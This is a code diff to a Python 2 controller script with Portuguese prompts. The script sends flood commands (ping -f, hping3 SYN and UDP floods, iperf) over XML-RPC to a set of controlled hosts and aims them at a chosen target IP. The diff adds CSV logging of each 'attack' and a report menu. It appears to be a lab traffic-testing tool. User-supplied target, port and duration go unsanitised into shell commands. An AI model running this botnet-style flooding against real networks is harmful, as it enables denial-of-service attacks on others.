@@ -2,8 +2,12 @@
 import xmlrpclib
 import random
 import re
+from attack_logger import AttackLogger
 
 server = xmlrpclib.ServerProxy('http://localhost:8000')
+
+# Inicializa o logger de ataques
+attack_logger = AttackLogger()
 
 controlled_hosts = set()
 available_hosts = {}
@@ -211,23 +215,31 @@ def launch_test_menu():
     test_type = raw_input("Escolha (1-4): ")
     
     command_template = ""
+    attack_type_name = ""
+    port = None
+    duration = None
+    
     if test_type == '1':
         duration = raw_input("duracao do ping em segundos (ex: 10): ")
         command_template = "timeout %s ping -f %s &" % (duration, target_ip)
+        attack_type_name = "ping"
     
     elif test_type == '2':
         duration = raw_input("duracao do ataque em segundos (ex: 10): ")
         port = raw_input("porta alvo (ex: 80): ")
         command_template = "timeout %s hping3 -S --flood -p %s %s &" % (duration, port, target_ip)
+        attack_type_name = "tcp_syn"
 
     elif test_type == '3':
         duration = raw_input("duracao do ataque em segundos (ex: 10): ")
         port = raw_input("Porta alvo (ex: 53): ")
         command_template = "timeout %s hping3 --udp --flood -p %s %s &" % (duration, port, target_ip)
+        attack_type_name = "udp"
 
     elif test_type == '4':
         duration = raw_input("duracao do iperf em segundos (ex: 10): ")
         command_template = "iperf -c %s -t %s &" % (target_ip, duration)
+        attack_type_name = "iperf"
     else:
         return
 
@@ -249,6 +261,31 @@ def launch_test_menu():
             print "    erro ao contatar %s: %s" % (host_name, e)
 
     print "comandos de teste enviados."
+    
+    # Registra o ataque no CSV
+    try:
+        attack_id = attack_logger.log_attack(
+            attack_type=attack_type_name,
+            attackers=attackers,
+            target_ip=target_ip,
+            target_port=port,
+            duration=duration
+        )
+        print "\nataque registrado no CSV com ID: %s" % attack_id
+    except Exception as e:
+        print "\nerro ao registrar ataque: %s" % e
+
+def view_attack_report():
+    """Exibe o relatorio de ataques registrados."""
+    print "\n--- relatorio de ataques ---"
+    try:
+        report = attack_logger.generate_report()
+        if report:
+            print report
+        else:
+            print "nenhum ataque registrado ainda."
+    except Exception as e:
+        print "erro ao gerar relatorio: %s" % e
 
 def main():
     if not update_available_hosts():
@@ -261,14 +298,17 @@ def main():
         print "\n====== menu principal do controlador ======"
         print "1. gerenciamento de hosts"
         print "2. lancar teste de trafego"
-        print "3. sair"
-        choice = raw_input("Escolha (1-3): ")
+        print "3. visualizar relatorio de ataques"
+        print "4. sair"
+        choice = raw_input("Escolha (1-4): ")
 
         if choice == '1':
             host_management_menu()
         elif choice == '2':
             launch_test_menu()
         elif choice == '3':
+            view_attack_report()
+        elif choice == '4':
             break
         else:
             pass
